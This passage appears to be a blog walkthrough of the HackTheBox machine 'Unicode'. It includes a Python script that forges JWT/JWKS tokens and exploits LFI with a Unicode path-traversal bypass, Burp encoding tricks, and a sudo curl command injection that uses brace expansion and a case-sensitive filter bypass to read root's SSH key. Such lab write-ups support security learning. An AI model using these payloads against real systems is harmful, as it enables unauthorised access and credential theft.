<span class="k">def</span> <span class="nf">getValues</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">GenTokenAndJWKS</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">GenRequiredFiles</span><span class="p">():</span>
    <span class="n">values</span> <span class="o">=</span> <span class="n">getValues</span><span class="p">()</span>
    <span class="c1"># write modified jwks in "jwks.json"
</span>    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] 'jwks.json' and 'jwt.token' will be saved in[CWD]: </span><span class="si">{</span><span class="n">files_path</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">a_file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">files_path</span><span class="si">}</span><span class="s">/jwks.json"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span>
    <span class="n">json</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">values</span><span class="p">.</span><span class="n">modified_jwks</span><span class="p">,</span> <span class="n">a_file</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">a_file</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="c1"># Write jwt token in a file
</span>    <span class="n">a_file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">files_path</span><span class="si">}</span><span class="s">/jwk.token"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span>
    <span class="n">a_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">values</span><span class="p">.</span><span class="n">jwt_token</span><span class="p">)</span>
    <span class="n">a_file</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>


<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">genFiles</span><span class="p">:</span>
    <span class="n">GenRequiredFiles</span><span class="p">()</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">jwt_token</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">files_path</span><span class="si">}</span><span class="s">/jwk.token"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
    <span class="n">cookies_dict</span> <span class="o">=</span> <span class="p">{</span><span class="s">"auth"</span><span class="p">:</span> <span class="n">jwt_token</span><span class="p">}</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">genFiles</span><span class="p">:</span>
        <span class="c1"># Test token
</span>        <span class="nb">input</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Run 'sudo python3 -m http.server 80' on CWD before continue[ENTER]..."</span><span class="p">)</span>
        <span class="n">rspn</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">/dashboard/"</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies_dict</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[!] Token take us to: </span><span class="si">{</span><span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'&lt;title&gt;(.*?)&lt;/title&gt;'</span><span class="p">,</span> <span class="n">rspn</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">except</span> <span class="nb">FileNotFoundError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">lfi</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">lfi_rspn</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">/display/?page=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies_dict</span><span class="p">)</span>
    <span class="k">if</span> <span class="s">'Unauthorized'</span> <span class="ow">in</span> <span class="n">lfi_rspn</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="nb">exit</span><span class="p">(</span><span class="s">'Unauthorized'</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">'&lt;h3&gt;(.*?)&lt;/h3&gt;'</span><span class="p">,</span> <span class="n">lfi_rspn</span><span class="p">.</span><span class="n">text</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] </span><span class="si">{</span><span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'&lt;h3&gt;(.*?)&lt;/h3&gt;'</span><span class="p">,</span> <span class="n">lfi_rspn</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s">!"</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">'&lt;title&gt;(.*?)&lt;/title&gt;'</span><span class="p">,</span> <span class="n">lfi_rspn</span><span class="p">.</span><span class="n">text</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'&lt;title&gt;(.*?)&lt;/title&gt;'</span><span class="p">,</span> <span class="n">lfi_rspn</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">lfi_rspn</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>


<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">lfi</span><span class="p">:</span>
    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"︰/︰/︰/︰/︰/︰</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">lfi</span><span class="si">}</span><span class="s">"</span>
    <span class="n">lfi</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
</pre></table></code></div></div><h3 id="burp-issue"><span class="mr-2">burp issue</span><a href="#burp-issue" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>while sending request with unicode characters burp automatically convert these character before forwarding and breaks the bypass.</p><p><img data-src="/assets/img/posts/unicode/burp-annoying-normalizer.png" alt="" data-proofer-ignore></p><p>from level of my knowledge, Burp only takes every character as single byte character.</p><p>Hex value of <strong><code class="language-plaintext highlighter-rouge">︰</code></strong> » <code class="language-plaintext highlighter-rouge">ef b8 b0</code> which represent of three unicode characters -</p><div class="table-wrapper"><table><thead><tr><th>Hex<th>unicode char<tbody><tr><td><code class="language-plaintext highlighter-rouge">ef</code><td><strong><code class="language-plaintext highlighter-rouge">ï</code></strong><tr><td><code class="language-plaintext highlighter-rouge">b8</code><td><strong><code class="language-plaintext highlighter-rouge">¸</code></strong><tr><td><code class="language-plaintext highlighter-rouge">b0</code><td><strong><code class="language-plaintext highlighter-rouge">°</code></strong></table></div><p>And combinations of these three characters create a unicode character <strong>vertical two dot leader</strong> <code class="language-plaintext highlighter-rouge">︰</code></p><p>and when we past <code class="language-plaintext highlighter-rouge">︰</code> it converted to <code class="language-plaintext highlighter-rouge">0</code>.</p><p>to solve this we need to load all character separately <code class="language-plaintext highlighter-rouge">ï¸°</code> which normalize to <code class="language-plaintext highlighter-rouge">︰</code></p><p>to make it easy we can encode <code class="language-plaintext highlighter-rouge">︰</code> in base64 and after pasting in burp decode base64.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ <span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'︰'</span> | <span class="nb">base64
</span>77iw
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unicode/burp-base-to-unic.gif" alt="" data-proofer-ignore></p><p>from nginx config file found about <code class="language-plaintext highlighter-rouge">db.yaml</code></p><p><img data-src="/assets/img/posts/unicode/nginx-config.png" alt="" data-proofer-ignore></p><p>And, From <code class="language-plaintext highlighter-rouge">db.yaml</code> got user creds.</p><p><img data-src="/assets/img/posts/unicode/user-creds.png" alt="" data-proofer-ignore></p><ul><li>Worked for user <code class="language-plaintext highlighter-rouge">code</code> ssh login.</ul><h1 id="privesc">Privesc</h1><p>User “code” allowed to run <code class="language-plaintext highlighter-rouge">/usr/bin/treport</code> as root with no password.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>code@code:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>code on code:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User code may run the following commands on code:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/treport
</pre></table></code></div></div><p>After some testing, Found out</p><ul><li>This is a python script and possible created with <code class="language-plaintext highlighter-rouge">pyinstaller</code><li><p>There are 4 options it in program</p><p><img data-src="/assets/img/posts/unicode/pyexe-opts.png" alt="" data-proofer-ignore></p><li>First 2 options don’t return anything interesting.<li><p>option 3 fetching urls and it’s using <code class="language-plaintext highlighter-rouge">curl</code></p><p><img data-src="/assets/img/posts/unicode/curl-in-pyexe.png" alt="" data-proofer-ignore></p><li><p>And special characters are not allowed</p><p><img data-src="/assets/img/posts/unicode/pyexe-not-spl-char.png" alt="" data-proofer-ignore></p></ul><h2 id="python-byte-codes-decompile"><span class="mr-2">Python byte-codes decompile</span><a href="#python-byte-codes-decompile" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>There is a script which we can use to extract python byte-codes: <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a>.</p><p><img data-src="/assets/img/posts/unicode/extract-pyc.png" alt="" data-proofer-ignore></p><p>So, There is a well-known tool for decompiling python3 byte-codes <a href="https://github.com/rocky/python-decompile3">python-decompile3</a> but there are some <a href="https://github.com/rocky/python-decompile3/issues/45">issues</a> going on on this project.</p><p>but there is a another tool not fully stable but it worked: <a href="https://github.com/zrax/pycdc">pycdc</a>.</p><p>Setup pycdc and build executable</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>git clone https://github.com/zrax/pycdc <span class="o">&amp;&amp;</span> <span class="nb">cd </span>pycdc
cmake <span class="nb">.</span>
cmake <span class="nt">--build</span> <span class="nb">.</span>
</pre></table></code></div></div><p>Then use <code class="language-plaintext highlighter-rouge">pycdc</code> to extract source from <code class="language-plaintext highlighter-rouge">treport.pyc</code> file</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>❯ ./pycdc treport.pyc <span class="o">&gt;</span> treport.py
Unsupported opcode: &lt;255&gt;
Unsupported opcode: &lt;255&gt;
Unsupported opcode: &lt;255&gt;
</pre></table></code></div></div><p>Only information get form python source is that there is a command injection in option 3 and most of the special character are blacklisted.</p><p><img data-src="/assets/img/posts/unicode/treport-source.png" alt="" data-proofer-ignore></p><h2 id="command-injection"><span class="mr-2">Command injection</span><a href="#command-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>There are so many useful character are blacklisted but not all.</p><ul><li>blacklisted: <code class="language-plaintext highlighter-rouge">$`;&amp;|||&gt;&lt;?'@#$%^()</code><li>allowed: <code class="language-plaintext highlighter-rouge">*[]-"{}\:,./+=!~</code></ul><p>And there is a flag <code class="language-plaintext highlighter-rouge">-K</code> which allow user to load config file</p><p><img data-src="/assets/img/posts/unicode/curl-flag.png" alt="" data-proofer-ignore></p><p>and there is a bash trick to execute a command with its argument without space using <code class="language-plaintext highlighter-rouge">{}</code> and argument separated with <code class="language-plaintext highlighter-rouge">,</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ bash <span class="nt">-c</span> <span class="s1">'{uname,-s}'</span>
Linux
</pre></table></code></div></div><p>it is possible to read files from stderr of curl with <code class="language-plaintext highlighter-rouge">-K</code> but this messed-up the file.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">{</span><span class="nt">-K</span>,/root/.ssh/id_rsa<span class="o">}</span>
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unicode/read-root-rsa.png" alt="" data-proofer-ignore></p><p>There is a one comparison in the python source that blacklisting some protocols</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="s">'file'</span> <span class="ow">in</span> <span class="n">ip</span> <span class="ow">and</span> <span class="s">'gopher'</span> <span class="ow">in</span> <span class="n">ip</span> <span class="ow">or</span> <span class="s">'mysql'</span> <span class="ow">in</span> <span class="n">ip</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">'INVALID URL'</span><span class="p">)</span>
</pre></table></code></div></div><p>But this is case sensitive and eassliy bypass capital character like <code class="language-plaintext highlighter-rouge">File</code>, <code class="language-plaintext highlighter-rouge">Gopher</code>, <code class="language-plaintext highlighter-rouge">Mysql</code> without affecting the behaviour in curl command.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>code@code:~<span class="nv">$ </span>curl File:///etc/hostname
code
</pre></table></code></div></div><p>but there is one more error, in the source code curl command outputting in the <code class="language-plaintext highlighter-rouge">/root/reports/</code> directory</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">cmd</span> <span class="o">=</span> <span class="s">'/bin/bash -c "curl '</span> <span class="o">+</span> <span class="n">ip</span> <span class="o">+</span> <span class="s">' -o /root/reports/threat_report_'</span> <span class="o">+</span> <span class="n">current_time</span> <span class="o">+</span> <span class="s">'"'</span>
</pre></table></code></div></div><p>but it looks like that direcotry in not presented there.</p><p><img data-src="/assets/img/posts/unicode/no-dir-error.png" alt="" data-proofer-ignore></p><p>To bypass this with <code class="language-plaintext highlighter-rouge">file</code> protocol, we can combine it with our first bypass technique and use with <code class="language-plaintext highlighter-rouge">--create-dirs</code> flag which, When used in conjunction with the <code class="language-plaintext highlighter-rouge">-o</code>, <code class="language-plaintext highlighter-rouge">--output</code> option, curl will create the necessary local directory hierarchy as needed.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">{</span>File:///root/.ssh/id_rsa,--create-dirs<span class="o">}</span>
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unicode/root-rsa.png" alt="" data-proofer-ignore></p><p>Don’t know why but this key isn’t working for me.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a>, <a href='/categories/linux/'>linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/jwt/" class="post-tag no-text-decoration" >jwt</a> <a href="/tags/jwt-jku-bypass/" class="post-tag no-text-decoration" >jwt jku bypass</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >lfi</a> <a href="/tags/python-byte-codes-decompile/" class="post-tag no-text-decoration" >python byte-codes decompile</a> <a href="/tags/command-injection/" class="post-tag no-text-decoration" >command injection</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox - Unicode - Poorduck&amp;url=https://x00tex.github.io/posts/unicode/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox - Unicode - Poorduck&amp;u=https://x00tex.github.io/posts/unicode/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://x00tex.github.io/posts/unicode/&amp;text=Hackthebox - Unicode - Poorduck" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/meta/">Hackthebox - Meta</a><li><a href="/posts/pandora/">Hackthebox - Pandora</a><li><a href="/posts/writer/">Hackthebox - Writer</a><li><a href="/posts/blunder/">Hackthebox - Blunder</a><li><a href="/posts/luanne/">Hackthebox - Luanne</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/devzat/"><div class="card-body"> <em class="timeago small" data-ts="1637951400" > 2021-11-26 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Devzat</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.118 devzat.htb nmap scan: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: ...</p></div></div></a></div><div class="card"> <a href="/posts/pikaboo/"><div class="card-body"> <em class="timeago small" data-ts="1639161000" > 2021-12-10 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Pikaboo</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.10.249 pikaboo.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 1...</p></div></div></a></div><div class="card"> <a href="/posts/writer/"><div class="card-body"> <em class="timeago small" data-ts="1639420200" > 2021-12-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Writer</h3><div class="text-muted small"><p> Enumeration IP-ADDR: 10.10.11.101 writer.htb nmap scan: 1 2 3 4 5 6 7 8 9 10 11 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/intelligence/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox - Intelligence</p></a> <a href="/posts/pikaboo/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox - Pikaboo</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/p00rduck">p00rduck</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
